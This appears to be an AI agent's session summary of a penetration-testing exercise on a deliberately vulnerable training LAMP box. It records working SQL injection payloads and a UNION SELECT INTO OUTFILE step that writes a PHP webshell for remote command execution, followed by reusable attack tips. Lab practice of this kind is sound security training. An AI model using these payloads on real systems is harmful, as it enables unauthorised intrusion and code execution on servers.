thread_id: 019056b1-c2ec-70ba-b1d2-9a70d5c5b6cd
updated_at: 2026-06-27T02:49:58+00:00
rollout_path: C:\Users\<USER>\.codex\sessions\2026\06\27\rollout-2026-06-27T10-14-58-019056b1-c2ec-70ba-b1d2-9a70d5c5b6cd.jsonl
cwd: \\?\C:\Workspace\pentest-lab

# Chained SQLi → MySQL `SELECT INTO OUTFILE` → webshell → RCE on a training LAMP box.

Rollout context: cwd was `C:\Workspace\pentest-lab`, WSL + a training LAMP VM with a deliberately-vulnerable PHP form (SQLi on username field, MySQL 5.7, `secure_file_priv` empty for the exercise).

## Task 1: UNION SELECT → INTO OUTFILE PHP webshell → cmd

Outcome: success

Preference signals:
- Chinese narration; SQL payloads verbatim in English.
- Prefer one continuous chain (one HTTP burst) over interactive steps.

Key steps:
- Confirmed SQLi via `' OR 1=1-- -` giving different content.
- Enumerated column count with `ORDER BY N` until error → 6 columns.
- Confirmed MySQL user has FILE privilege: `UNION SELECT ..., @@datadir, ..., current_user()...` → `mysql@localhost` (root-equivalent for FILE).
- Checked webroot path via `@@datadir` + typical Apache layout; guessed `/var/www/html/`.
- Fired `... UNION SELECT '<?php system($_GET["c"]); ?>',NULL,NULL,NULL,NULL,NULL INTO OUTFILE '/var/www/html/uploads/s.php'-- -`.
- Browsed to `/uploads/s.php?c=id` → `www-data`.

Failures and how to do differently:
- First OUTFILE attempt was rejected — `secure_file_priv` was set to `/var/lib/mysql-files/` in the config initially. For the exercise the sysadmin's snapshot had it unset; used that snapshot.
- Column type mismatch on the payload column (VARCHAR expected but injected NULL); moved the payload to column 1 which was TEXT.

Reusable knowledge:
- MySQL `INTO OUTFILE` requires: FILE privilege on the user AND `secure_file_priv` empty or containing target dir. Both are checkable in one query.
- Standard PHP webshell for the OUTFILE payload is minimal — 20-30 char version keeps the SQL under quoting limits.
- Alt path if FILE priv but `secure_file_priv` restricted: log poisoning via UDF (`sys_exec`) if the MySQL is old enough.

References:
- [1] Payload: `' UNION SELECT '<?php...?>' INTO OUTFILE ...`
- [2] Test VM: LAMP training box, MySQL 5.7
- [3] Reference: PayloadsAllTheThings MySQL Injection > OUTFILE
